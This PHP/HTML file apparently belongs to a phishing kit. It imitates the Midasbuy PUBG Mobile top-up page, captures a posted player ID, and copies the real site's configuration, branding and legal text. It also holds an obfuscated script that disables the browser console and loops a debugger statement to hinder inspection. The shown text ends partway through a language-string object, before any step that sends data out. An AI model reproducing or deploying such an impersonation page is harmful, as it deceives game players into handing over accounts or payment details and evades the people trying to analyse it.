<?php
// MENANGKAP DATA YANG DI-INPUT
$playid = $_POST['playid'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($playid == ""){
header("Location: index.php");
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no">
    <meta name="robots" content="index,follow">
    <title>PUBG Mobile - Midasbuy</title>
    <meta name="keywords" content="" />
    <meta name="description" content="" />

    <script type="text/javascript">
        if (!window.console) {
            window.console = {
                log: function() {},
                info: function() {},
                error: function() {}
            }
        }
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/serviceWorker');
        }
    </script>
    <script type="text/javascript">
        window.__PAY_INFO = {
            "needSelectPF": {},
            "short_openid_type": "idip",
            "short_openid_rule": "^[1-9]\\d+$",
            "isv3": false,
            "shopcartv2": false,
            "drm_info": {
                "groupid": "check_in",
                "area": "Other",
                "country": "OT",
                "version": "3.0",
                "midasbuyArea": "Other"
            },
            "midasUser": null,
            "currentBindUser": null,
            "gameUsers": [],
            "openid": "",
            "appid": "1450015065",
            "UUID": "089506823084503771626279302960",
            "pf": "mds_hkweb_pc-v2-android-midasweb-midasbuy",
            "type": "save",
            "currencyIcon": "https://cdn.midasbuy.com/images/apps/pubgm/1599549775068xtoGCDwY.png",
            "currencySmallIcon": "https://cdn.midasbuy.com/images/apps/pubgm/24_24d2c7b78c.png",
            "currencyIconMap": [{
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546007887MVeNUtB6.png",
                "max": "299"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546030876PIvqwGaa.png",
                "max": "599",
                "min": "300"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546041426W8hmErMS.png",
                "max": "1499",
                "min": "600"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546052747L5gSu7VB.png",
                "max": "2999",
                "min": "1500"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546061912PLgMlY23.png",
                "max": "5999",
                "min": "3000"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546071746KqkIhrzG.png",
                "min": "6000"
            }],
            "country": "OT",
            "midasbuyArea": "Other",
            "cgi_language": "EN",
            "sandbox": "0",
            "zoneid": "1",
            "not_query_drm": "0",
            "currency_type": "USD",
            "currency_config": {
                "currencySymbol": " USD"
            },
            "adyen_url": "",
            "adyen_svrtime": ""
        };
        if (window.__PAY_INFO) {
            window.__PAY_INFO.pageid = "page_" + (Math.random().toString().replace(".", ""));
        }
        window.__Report_INFO = {
            "devMode": false,
            "tid": "089506823084503771626279302960",
            "openid": "",
            "appid": "",
            "pf": "",
            "countryCode": "ot",
            "from": "",
            "midasuid": "uv_089506823084503771626279302960",
            "reportUrl": "https://report1.midasbuy.com/cgi-bin/log_data.fcg"
        };
        window.__RTL = false;

        window._SHOPCODE = "midasbuy";
        window._COUNTRY = "ot";
        window.__showErrorDetail = {
            "ae": "*",
            "bd": "*",
            "bh": "*",
            "br": "*",
            "ch": "*",
            "de": "*",
            "dz": "*",
            "eg": "*",
            "es": "*",
            "fr": "*",
            "gb": "*",
            "hk": "*",
            "id": "*",
            "in": "*",
            "iq": "*",
            "ir": "*",
            "it": "*",
            "kh": "*",
            "kw": "*",
            "la": "*",
            "lk": "*",
            "ly": "*",
            "ma": "*",
            "mm": "*",
            "mx": "*",
            "my": "*",
            "nl": "*",
            "np": "*",
            "om": "*",
            "ot": "*",
            "ph": "*",
            "pk": "*",
            "pl": "*",
            "qa": "*",
            "ru": "*",
            "sa": "*",
            "se": "*",
            "sg": "*",
            "th": "*",
            "tn": "*",
            "tr": "*",
            "tw": "*",
            "za": "*"
        };
        window.enable_nopay_contract = true;
    </script>
    <!-- aegis上报开关 -->

    <script src="https://cdn-go.cn/aegis/aegis-sdk/latest/aegis.min.js?_bid=3977"></script>
    <script type="text/javascript">
        var aegis = new Aegis({
            id: 1124,
            uin: __Report_INFO.midasuid,
            beforeReport: function(log) {
                // 这个错误是模拟器环境报的，不需要上报
                if (log.level == 4 && log.msg) {
                    if (log.msg.indexOf('__tbsRecieveNativeEvent__') !== -1 || log.msg.indexOf('getReadMode') !== -1)
                        return false
                }
            },
            reportApiSpeed: true, // 接口测速
            reportAssetSpeed: true // 静态资源测速
        });
        // aegis.infoAll('aegis: Interview from ' + __Report_INFO.midasuid);
    </script>


    <script>
        ! function(t, e) {
            "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : (t = t || self).assetsRetry = e()
        }(this, function() {
            "use strict";

            function a(t) {
                return t
            }

            function y() {}

            function r(t, e) {
                try {
                    return "function" == typeof t[e]
                } catch (t) {
                    return !1
                }
            }

            function p(t) {
                return Array.isArray(t) ? t.reduce(function(t, e, n, r) {
                    return t[e] = r[(n + 1) % r.length], t
                }, {}) : t
            }

            function h(e, t) {
                return Object.keys(t).filter(function(t) {
                    return -1 < e.indexOf(t)
                }).sort(function(t, e) {
                    return e.length - t.length
                })[0]
            }
            var e, m = "retryTimes",
                b = "succeeded",
                E = "failed",
                O = "maxRetryCount",
                j = "onRetry",
                f = "onSuccess",
                s = "onFail",
                w = "domain",
                v = "_assetsRetryScript",
                g = "_assetsRetryOnerror",
                l = "script",
                A = "data-assets-retry-hooked",
                S = "data-assets-retry-ignore",
                k = "data-retry-id",
                d = window,
                R = window.document,
                n = d.HTMLElement,
                L = d.HTMLScriptElement,
                c = d.HTMLStyleElement,
                T = d.HTMLLinkElement,
                x = d.HTMLImageElement,
                o = Object.prototype.hasOwnProperty,
                _ = function(t, e, n) {
                    var r = t.indexOf(e);
                    return -1 === r ? t : t.substring(0, r) + n + t.substring(r + e.length)
                },
                M = function(t) {
                    return [].slice.call(t)
                },
                N = function(e, t, n, r) {
                    void 0 === n && (n = y), void 0 === r && (r = !1);
                    var o, i, c, u, a, f = r || e.defer || e.async;
                    "loading" !== R.readyState || /Edge|MSIE|rv:/i.test(navigator.userAgent) || f ? (o = R.createElement(l), Object.keys(L.prototype).forEach(function(t) {
                        if ("src" !== t && e[t] && "object" != typeof e[t]) try {
                            o[t] = e[t]
                        } catch (t) {}
                    }), o.src = t, o.onload = e.onload, o.onerror = e.onerror, o.setAttribute(k, C()), (i = e.getAttribute("nonce")) && o.setAttribute("nonce", i), R.getElementsByTagName("head")[0].appendChild(o)) : (c = C(), u = e.outerHTML.replace(/data-retry-id="[^"]+"/, "").replace(/src=(?:"[^"]+"|.+)([ >])/, k + "=" + c + ' src="' + t + '"$1'), R.write(u), (a = R.querySelector("script[" + k + '="' + c + '"]')) && (a.onload = n))
                },
                H = function(e) {
                    try {
                        return e.rules
                    } catch (t) {
                        try {
                            return e.cssRules
                        } catch (t) {
                            return null
                        }
                    }
                },
                I = function(e, t, n) {
                    var r = R.createElement("link");
                    Object.keys(T.prototype).forEach(function(t) {
                        if ("href" !== t && e[t] && "object" != typeof e[t]) try {
                            r[t] = e[t]
                        } catch (t) {}
                    }), r.href = t, r.onload = n, r.setAttribute(k, C()), R.getElementsByTagName("head")[0].appendChild(r)
                },
                P = function(t) {
                    return t ? t instanceof n ? [t.nodeName, t.src, t.href, t.getAttribute(k)].join(";") : "not_supported" : "null"
                },
                C = function() {
                    return Math.random().toString(36).slice(2)
                },
                B = function(t) {
                    return t instanceof L || t instanceof x ? t.src : t instanceof T ? t.href : null
                },
                F = {},
                $ = function(t, e) {
                    var n, r = q(t, e),
                        o = r[0],
                        i = r[1];
                    return o ? (F[o] = F[o] || ((n = {})[m] = 0, n[E] = [], n[b] = [], n), [i, F[o]]) : []
                },
                q = function(t, e) {
                    var n, r, o = h(t, e);
                    return o ? [(r = o, (n = t).substr(n.indexOf(r) + r.length, n.length)), o] : ["", ""]
                };
            try {
                e = function(t) {
                    for (var e = Object.getPrototypeOf ? Object.getPrototypeOf : function(t) {
                            return t.__proto__
                        }, n = Object.keys(t); e(t);) n = n.concat(Object.keys(e(t))), t = e(t);
                    return n.filter(function(t) {
                        return "constructor" !== t
                    })
                }(L.prototype)
            } catch (t) {}

            function i(f, t) {
                var s = t[O],
                    l = p(t[w]),
                    d = t[j];
                return e.reduce(function(t, e) {
                    var n = r(L.prototype, e);
                    return t[e] = n ? {
                        value: function() {
                            return f[v][e].apply(f[v], arguments)
                        }
                    } : {
                        set: function(o) {
                            return "onerror" === e ? (f[g] = o, void(f[v].onerror = function(r) {
                                r.stopPropagation && r.stopPropagation();

                                function t() {
                                    return t = f[g], e = f[v], n = r, "function" != typeof t ? null : t.call(e, n);
                                    var t, e, n
                                }
                                var e = f[v].src,
                                    n = $(e, l),
                                    o = n[0],
                                    i = n[1],
                                    c = f[v].hasAttribute(S);
                                if (!o || !i || c) return t();
                                var u = _(e, o, l[o]),
                                    a = d(u, e, i);
                                if (null === a) return t();
                                if ("string" != typeof a) throw new Error("a string should be returned in `onRetry` function");
                                i[m] <= s ? N(f[v], a, y, !0) : t()
                            })) : "onload" === e ? (f._assetsRetryOnload = o, void(f[v].onload = function(t) {
                                var e = f[v].src,
                                    n = $(e, l),
                                    r = (n[0], n[1]);
                                r && -1 === r[E].indexOf(e) && r[b].push(e), o && !o._called && (o._called = !0, o.call(f[v], t))
                            })) : void(f[v][e] = o)
                        },
                        get: function() {
                            return f[v][e]
                        }
                    }, t
                }, {})
            }
            var z = function(n) {
                    var r = R.createElement;
                    R.createElement = function(t, e) {
                        return t === l ? function(t, e) {
                            var n;
                            t.setAttribute(A, "true");
                            var r = ((n = {})[v] = t, n[g] = y, n),
                                o = i(r, e);
                            return Object.defineProperties(r, o), r
                        }(r.call(R, l), n) : r.call(R, t, e)
                    }, R.createElement.toString = function() {
                        return "function createElement() { [native code] }"
                    }
                },
                Z = function(n) {
                    Object.keys(n).filter(function(t) {
                        return r(n, t)
                    }).forEach(function(t) {
                        var e = n[t];
                        n[t] = function() {
                            var t = [].slice.call(arguments).map(function(t) {
                                return t && o.call(t, v) ? t[v] : t
                            });
                            return e.apply(this, t)
                        }, /^\w+$/.test(t) && (n[t].toString = new Function("return 'function " + t + "() { [native code] }'"))
                    })
                };
            var D = {};

            function G(p) {
                function c(t) {
                    if (t) {
                        var e = t.target || t.srcElement,
                            n = B(e);
                        if (n) {
                            var r = $(n, g),
                                o = r[0],
                                i = r[1],
                                c = e instanceof HTMLElement && e.hasAttribute(S);
                            if (i && o && !c) {
                                i[m]++, i[E].push(n);
                                var u, a = i[m] > p[O];
                                if (a && (u = q(n, g)[0], v(u)), g[o] && !a) {
                                    var f = g[o],
                                        s = _(n, o, f),
                                        l = h(s, n, i);
                                    if (null !== l) {
                                        if ("string" != typeof l) throw new Error("a string should be returned in `onRetry` function");
                                        var d, y = P(e);
                                        D[y] || (D[y] = !0, d = function() {
                                            i[b].push(l)
                                        }, e instanceof L && !e.getAttribute(A) && e.src ? N(e, l, d) : e instanceof T && e.href ? I(e, l, d) : e instanceof x && e.src && (e.setAttribute(k, C()), e.src = l, e.onload = d))
                                    }
                                }
                            }
                        }
                    }
                }
                var h = p[j],
                    u = p[f],
                    v = p[s],
                    g = p[w];
                R.addEventListener("error", c, !0), R.addEventListener("load", function(t) {
                    var e, n, r, o, i;
                    t && (e = t.target || t.srcElement, (n = B(e)) && (e.getAttribute(k) && (r = q(n, g)[0], u(r)), e instanceof T && R.styleSheets && (o = M(R.styleSheets).filter(function(t) {
                        return t.href === e.href
                    })[0], null !== (i = H(o)) && 0 === i.length && c(t))))
                }, !0)
            }

            function u(t, e, n, r, o) {
                var i = o[w],
                    c = o[j],
                    u = e.style && e.style[t];
                if (u && !/^url\(["']?data:/.test(u)) {
                    var a = u.match(/^url\(["']?(.+?)["']?\)/) || [],
                        f = a[1];
                    if (f) {
                        var s = h(f, i);
                        if (s && i[s]) {
                            var l = Object.keys(i).map(function(t) {
                                    var e = _(f, s, t);
                                    return 'url("' + c(e, f, null) + '")'
                                }).join(","),
                                d = e.selectorText + ("{ " + t.replace(/([a-z])([A-Z])/g, function(t, e, n) {
                                    return e + "-" + n.toLowerCase()
                                })) + ": " + l + " !important; }";
                            try {
                                n.insertRule(d, r.length)
                            } catch (t) {
                                n.insertRule(d, 0)
                            }
                        }
                    }
                }
            }
            var J = {},
                K = [],
                Q = function(t, o) {
                    var i = ["backgroundImage", "borderImage", "listStyleImage"];
                    t.forEach(function(n) {
                        var r, t = H(n);
                        null !== t && ((r = M(t)).forEach(function(e) {
                            i.forEach(function(t) {
                                u(t, e, n, r, o)
                            })
                        }), n.href && (J[n.href] = !0), n.ownerNode instanceof c && K.push(n.ownerNode))
                    })
                },
                U = function(t, n) {
                    return M(t).filter(function(t) {
                        if (!H(t)) return !1;
                        if (t.href) return !J[t.href] && !!h(t.href, n);
                        var e = t.ownerNode;
                        return !(e instanceof c && -1 < K.indexOf(e))
                    })
                };
            return function(t) {
                var e, n, r, o;
                void 0 === t && (t = {});
                try {
                    if ("object" != typeof t[w]) throw new Error("opts.domain cannot be non-object.");
                    var i = [O, j, f, s, w],
                        c = Object.keys(t).filter(function(t) {
                            return -1 === i.indexOf(t)
                        });
                    if (0 < c.length) throw new Error("option name: " + c.join(", ") + " is not valid.");
                    var u = ((e = {})[O] = t[O] || 3, e[j] = t[j] || a, e[f] = t[f] || y, e[s] = t[s] || y, e[w] = p(t[w]), e);
                    return z(u), "undefined" != typeof Node && Z(Node.prototype), "undefined" != typeof Element && Z(Element.prototype), G(u), n = u, r = R.styleSheets, o = n[w], r && setInterval(function() {
                        var t = U(R.styleSheets, o);
                        0 < t.length && Q(t, n)
                    }, 250), F
                } catch (t) {
                    d.console && console.error("[assetsRetry] error captured", t)
                }
            }
        });
    </script>
    <script>
        var assetsRetryRule = {
            "https://cdn.midasbuy.com/h5/overseah5/js": "https://cn.midasbuy.com/h5/overseah5/js",
            "https://cdn.midasbuy.com/oversea_web/static/css": "https://cn.midasbuy.com/oversea_web/static/css",
            "https://cdn.midasbuy.com/oversea_web/static/js": "https://cn.midasbuy.com/oversea_web/static/js",
            "https://cn.midasbuy.com/h5/overseah5/js": "https://cdn.midasbuy.com/h5/overseah5/js",
            "https://cn.midasbuy.com/oversea_web/static/css": "https://cdn.midasbuy.com/oversea_web/static/css",
            "https://cn.midasbuy.com/oversea_web/static/js": "https://cdn.midasbuy.com/oversea_web/static/js"
        };
        var assetsRetryStatistics = window.assetsRetry({
            domain: assetsRetryRule,
            maxRetryCount: 2,
            onRetry: function(currentUrl, originalUrl, statistics) {
                window.report && window.report.custom && window.report.custom('assets.retry.start', {
                    url: originalUrl
                });

                return currentUrl
            },
            onSuccess: function(currentUrl) {
                window.report && window.report.custom && window.report.custom('assets.retry.ok', {
                    url: currentUrl
                });
            },
            onFail: function(currentUrl) {
                window.report && window.report.custom && window.report.custom('assets.retry.fail', {
                    url: currentUrl
                });
            }
        })
    </script>


    <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/vendor.d97b0b21.css?max_age=864000" />

    <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/buypage.4ef96633.css?max_age=864000" />
    <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/media.7d12056d.css?max_age=864000" />



    <!--[if lte IE 9]><link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/ie.c768481b.css?max_age=864000"/><![endif]-->





    <script type="text/javascript" src="https://cdn.midasbuy.com/h5/overseah5/js/midas-oversea-h5page.js"></script>



    <script type="text/javascript" src="https://cdn.midasbuy.com/oversea_web/static/js/midas.runtime.js"></script>

    <script>
        ! function() {
            var r = {
                    7914: function(t) {
                        t.exports = function(t) {
                            return t && t.__esModule ? t : {
                                default: t
                            }
                        }, t.exports.default = t.exports, t.exports.__esModule = !0
                    },
                    98240: function(t, e) {
                        "use strict";
                        Object.defineProperty(e, "__esModule", {
                            value: !0
                        }), e.default = function(t) {
                            for (var e = 1; e <= arguments.length; e++)
                                if (arguments[e])
                                    for (var r in arguments[e]) Object.prototype.hasOwnProperty.call(arguments[e], r) && (t[r] = arguments[e][r]);
                            return t
                        }
                    }
                },
                o = {};

            function i(t) {
                var e = o[t];
                if (void 0 !== e) return e.exports;
                e = o[t] = {
                    exports: {}
                };
                return r[t](e, e.exports, i), e.exports
            }! function() {
                "use strict";
                var n = i(7914)(i(98240)),
                    u = window,
                    f = window.__Report_INFO || {},
                    t = {
                        doReport: function(t, e) {
                            var r = f.from || '',
                                o = f.midasuid || '';
                            u.fbq('track', t, (0, n.default)({
                                uuid: o,
                                pf: r
                            }, e || {}))
                        }
                    };
                u.fbReport = t
            }()
        }();
    </script>


    <script type="text/javascript">
        var _0x3d88 = ['log', 'debug', 'info', 'error', 'exception', 'table', 'warn', 'trace', 'apply', 'debu', 'gger', 'don', 'return\x20(function()\x20', '{}.constructor(\x22return\x20this\x22)(\x20)', 'console'];
        (function(_0x4b152f, _0x59d86c) {
            var _0x5c135a = function(_0x5b5d0f) {
                while (--_0x5b5d0f) {
                    _0x4b152f['push'](_0x4b152f['shift']());
                }
            };
            _0x5c135a(++_0x59d86c);
        }(_0x3d88, 0x170));
        var _0x306c = function(_0x4b152f, _0x59d86c) {
            _0x4b152f = _0x4b152f - 0x0;
            var _0x5c135a = _0x3d88[_0x4b152f];
            return _0x5c135a;
        };
        (function(_0x2605bc) {
            var _0x4c9a2c = function() {
                var _0x244728 = !![];
                return function(_0x3efc74, _0x16c2ac) {
                    var _0x4d7b05 = _0x244728 ? function() {
                        if (_0x16c2ac) {
                            var _0x45ed49 = _0x16c2ac[_0x306c('0x0')](_0x3efc74, arguments);
                            _0x16c2ac = null;
                            return _0x45ed49;
                        }
                    } : function() {};
                    _0x244728 = ![];
                    return _0x4d7b05;
                };
            }();
            var _0x4ed3d0 = [_0x306c('0x1'), _0x306c('0x2'), _0x306c('0x3')];

            function _0x17f16e() {
                var _0x41d7ca = _0x4c9a2c(this, function() {
                    var _0x6c13c9 = function() {};
                    var _0x187a25 = function() {
                        var _0x23d8ab;
                        try {
                            _0x23d8ab = Function(_0x306c('0x4') + _0x306c('0x5') + ');')();
                        } catch (_0x15bb1a) {
                            _0x23d8ab = window;
                        }
                        return _0x23d8ab;
                    };
                    var _0x4a78e1 = _0x187a25();
                    if (!_0x4a78e1[_0x306c('0x6')]) {
                        _0x4a78e1[_0x306c('0x6')] = function(_0x6c13c9) {
                            var _0x19ef79 = {};
                            _0x19ef79[_0x306c('0x7')] = _0x6c13c9;
                            _0x19ef79['warn'] = _0x6c13c9;
                            _0x19ef79[_0x306c('0x8')] = _0x6c13c9;
                            _0x19ef79[_0x306c('0x9')] = _0x6c13c9;
                            _0x19ef79[_0x306c('0xa')] = _0x6c13c9;
                            _0x19ef79[_0x306c('0xb')] = _0x6c13c9;
                            _0x19ef79[_0x306c('0xc')] = _0x6c13c9;
                            _0x19ef79['trace'] = _0x6c13c9;
                            return _0x19ef79;
                        }(_0x6c13c9);
                    } else {
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0x7')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xd')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0x8')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0x9')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xa')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xb')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xc')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xe')] = _0x6c13c9;
                    }
                });
                _0x41d7ca();
                return function() {
                    return eval(_0x4ed3d0[0x0] + _0x4ed3d0[0x1]);
                };
            }
            _0x2605bc[_0x4ed3d0[0x2]] = _0x17f16e();
            setInterval(_0x4ed3d0[0x2] + '()', 0xc8);
        }(window));
    </script>


    <script type="text/javascript">
        var globalReportParams = {};
        var goServerUrl = "//www.midasbuy.com/midas/usc/v1/123123";
        var goPublicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+DHIWQ7lNnwufS03eXfHeytqUH2OWxoFMP67o38bq/7PB1NaikC3Wb4O8bKF5L2iyIVD2M/QxtcV178BIUP6qJxAHly6B+xC3FJXONeYMQfL3D3GxaSavR/vlJhoaacXpCn30dj1njeVjsMWjJrUjqOCHuMY3UX+h6LrBIB3iywIDAQAB";
        var currentLang = "en";
        var langResource = {
            "title": "PUBG Mobile - Midasbuy",
            "adyenCashback": {
                "closeBtn": "confirm",
                "desc": "Make a purchase with your card on Midasbuy for a chance to win a 100% cashback<br/>Event period: 12/12-12/23 (UTC+8)<br/>Country: Saudi Arabia, Kuwait, Qatar, UAE<br/>Only users who make purchases by card are eligible to participate in this campaign<br/>Midasbuy will fully refund the amount of your current purchase if you win the 100% cashback<br/>The list of prize winners will be announced on our Facebook account every day",
                "subTitle": "",
                "title": ""
            },
            "birthConfirmBtn": "OK",
            "birthTitle": "Please confirm your birthday",
            "birthdayError": "Unfortunately we are unable to offer Midasbuy service to you at this time.",
            "bubblePop": {
                "bubbleTips": "REGISTER TO GET <span>PUBGM FREE</span> ITEM",
                "promoteTips": "Get PUBGM exclusive registeration gift for <span>FREE</span>"
            },
            "cancel": "Cancel",
            "channelRestore": {
                "default": {
                    "helpBtn": "OK",
                    "helpDesc": "The payment channel system is under maintenance, please choose another payment method",
                    "helpTitle": "Announcement"
                }
            },
            "channel_awards_tip": "Get <span class='light'>FREE REWARDS</span> when purchasing UC using the following payment method(s)",
            "checkBirthInput": "Enter Birthday",
            "checkRight4": " By ticking this box, you confirm that you have read and agreed to the <a data-link=\"pubgmSupplementaryTermsLink\" target='_blank' href='https://cdn.midasbuy.com/h5/overseah5/html/supplementary-terms-v2.html'>Supplementary Terms</a> and understand how it applies to your purchase and use of virtual goods and virtual currency in Playerunknown's BattleGround Mobile. These terms will be binding between you and Proxima Beta PTE. Limited.",
            "checkRight5": "You hereby consent to immediate performance of the contract and acknowledge that you will lose your right of withdrawal from the contract once the download or use of the virtual goods and/or virtual currency has commenced.",
            "currencyBtn": "Purchase",
            "email_feedback_input_error_tips": "Please enter a valid email",
            "email_feedback_input_label": "Email Address",
            "email_feedback_input_placeholder": "Enter your email",
            "email_feedback_pop_tips": "Please fill in your contact email address, customer service will contact you by email to help you complete the order.",
            "email_feedback_pop_title": "Fill in contact information",
            "email_feedback_remark_input_label": "Remarks",
            "email_feedback_remarks_input_placeholder": "Enter a note of no more than 50 characters",
            "errorMap": {
                "1138-1-12186": "Please choose another region to recharge.",
                "1138-1-12200": "Please choose another region to recharge.",
                "1138-1-12201": "Please choose another region to recharge.",
                "1138-1-12202": "Please choose another region to recharge.",
                "1138-1-12204": "Please choose another region to recharge.",
                "1138-30051-12186": "Please choose another region to recharge.",
                "1138-30051-12200": "Please choose another region to recharge.",
                "1138-30051-12201": "Please choose another region to recharge.",
                "1138-30051-12202": "Please choose another region to recharge.",
                "1138-30051-12204": "Please choose another region to recharge."
            },
            "errorTips": {
                "attention": "Tip",
                "confirm": "OK",
                "invaliduserid": "Please enter a valid User ID.",
                "tokenexpire": "Please refresh and try again."
            },
            "facebookButton": "Follow",
            "feedback": "Feedback",
            "footer": {
                "copyright": "COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED."
            },
            "gameIdInvalid": "Invalid Game ID",
            "gameIdLoginCharacName": "Nickname",
            "gameIdLoginId": "Player ID",
            "gameIdLoginInput": "Please enter Player ID",
            "gameIdLoginModifyButton": "Edit",
            "gameIdLoginOkButton": "OK",
            "gameIdLoginTitle": "Player ID Verification",
            "gameIdRequired": "Enter Game ID",
            "gamename": "PUBG MOBILE",
            "getInfoAsap": "Follow us on {0} for more information.",
            "goToOthers": "Go to your country",
            "header": {
                "accountSettings": "View Account",
                "cardManage": "Payment Manage",
                "checkVipStatus": "Check your status after log in",
                "events": "Event Center",
                "followFB": "Follow Midasbuy",
                "helpcenter": "Help Center",
                "helpcenterLink": "https://cdn.midasbuy.com/oversea_web/faq/faq.html",
                "index": "Home",
                "login": "SIGN IN",
                "logout": "Sign Out",
                "midasVip": "Midasbuy VIP",
                "myAccount": "My Account",
                "pcenter": "Account  Setting",
                "register": "CREATE ACCOUNT",
                "transactionRecord": "Transcation Record"
            },
            "homeBtn": "PUBG MOBILE",
            "itemBtn": "RP",
            "newCheckRight": "By ticking this box, you confirm that you agree to the Midasbuy <a data-link='termsOfServicesLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a>、<a data-link='privacyPolicyLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a> and <a data-link=\"pubgmSupplementaryTermsLink\" target='_blank' href='https://cdn.midasbuy.com/h5/overseah5/html/supplementary-terms-v2.html'>Supplementary Terms</a>.",
            "newCompliance": {
                "errorTips": "Please check the box to continue",
                "learnMore": "Learn more",
                "nextBtn": "Continue",
                "title": "Please check the following box"
            },
            "newComplianceItemList": [{
                "desc": "You confirm that you have read and agreed to the Midasbuy Terms of Services and understand how it applies to your use of Midasbuy.",
                "id": "001",
                "title": "1. You agree to Terms of Services"
            }, {
                "desc": "You confirm that you have read and agreed to the Midasbuy Privacy Policy and understand how it applies to your use of Midasbuy.",
                "id": "002",
                "title": "2. You agree to Privacy Policy"
            }, {
                "desc": "Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. ,a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our Privacy Policy.",
                "id": "004",
                "title": "3. You agree to transfer your data outside of the European Economic Area"
            }],
            "ok": "OK",
            "pay_too_frequent_tips": "Payment has been timed out. Please try again later or use another card. If you see this message repeatedly, you can contact customer service to get help completing the order.",
            "promotionsBtn": "Promotions",
            "redeemBtn": "Redeem",
            "retry": "Retry",
            "send": "Submit",
            "shopBtn": "Shop",
            "sorry": "Sorry",
            "subBtn": "SUBSCRIPTION",
            "success": "Success",
            "taxesBoxConfig": {
                "totalDesc": "Price includes taxes"
            },
            "xianyici": "One Purchase Only",
            "cancelPayBtn": "Back",
            "cantFindId": "Couldn't find your Player ID?",
            "checkRight1": "By ticking this box, you confirm that you have read and agreed to the Midasbuy <a data-link='termsOfServicesLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/terms.html'>Terms of Services</a> and understand how it applies to your use of Midasbuy.",
            "checkRight2": "By ticking this box, you confirm that you have read and agreed to the Midasbuy <a data-link='privacyPolicyLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>  and understand how it applies to your use of Midasbuy.",
            "checkRight3": "By ticking this box, you agree to transfer your data outside of the European Economic Area. Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. , a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and  the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our <a data-link='privacyPolicyLink' target='_blank' href='https://www.midasbuy.com/oversea_web/static/privacy.html'>Privacy Policy</a>.",
            "choosePayAmount": "Select Product",
            "choosePayMethod": "Payment Method",
            "clausePopTitle": "Please check the following box to continue.",
            "completedPay": "Payment completed",
            "enterBirthday": "Enter birthday",
            "enterBirthdayTitle": "Please confirm your birthday",
            "extraPoints": "Extra Points",
            "findIdButton": "OK",
            "findIdGuide1": "1. Enter the game",
            "findIdGuide2": "2. Find your player ID",
            "findIdTitle": "Couldn't find your Player ID?",
            "iknow": "OK",
            "otherPayMethod": "Other Payment Method",
            "payButton": "Pay now",
            "paymentFailButton": "Back",
            "paymentFailTitle": "Payment failed.",
            "pfDefaultSelect": "Choose",
            "pfRequired": "Please select your mobile phone system",
            "platForm": "System",
            "platformTips": "Currently only supports top-up service for wecomics Android users",
            "pleasePayASAP": "Please complete the payment soon",
            "queryingNoRes": "Payment result not found",
            "queryingNoResTips": "There might be some lag. If the payment has been completed, please check the game later.",
            "queryingPay": "Query has been made. Please wait",
            "taxLabel": "Tax Included",
            "taxesBoxPop": {
                "discount": "Discount",
                "earnPoints": "Earn Points",
                "earnValues": "Earn Value",
                "origiPrice": "Original Price",
                "summaryTitle": "PRICE SUMMARY",
                "taxes": "Taxes",
                "tips": " ",
                "total": "Total"
            },
            "totalPrice": "Total:",
            "vipPopContent": "Finish this Payment to become VIP",
            "vipPromotionMessage": "You can become VIP immediatly after finishing this payment.",
            "wxQrCodeGuide1": "Tap to save QR code to album.",
            "wxQrCodeGuide2": "Scan the QR code with WeChat to complete payment.",
            "wxQrCodeOtherChoice": "You can also recharge from your computer.",
            "wxQrCodeOtherLink": "www.midasbuy.com/hk/pubgm",
            "wxQrCodeTitle": "Please scan the QR code with WeChat to complete payment."
        };
        var footerLan = {
            "cookieCloseBtn": "Save and close",
            "cookieOff": "OFF",
            "cookieOn": "ON",
            "cookieP1": "We use cookies that are necessary to provide the service and also other cookies, including third-party cookies for performance and analysis. For more information on our cookie policy, please click here.    ",
            "cookieP2": "These cookies are necessary to provide you with the service and to use some of its features, such as to facilitate transactions.",
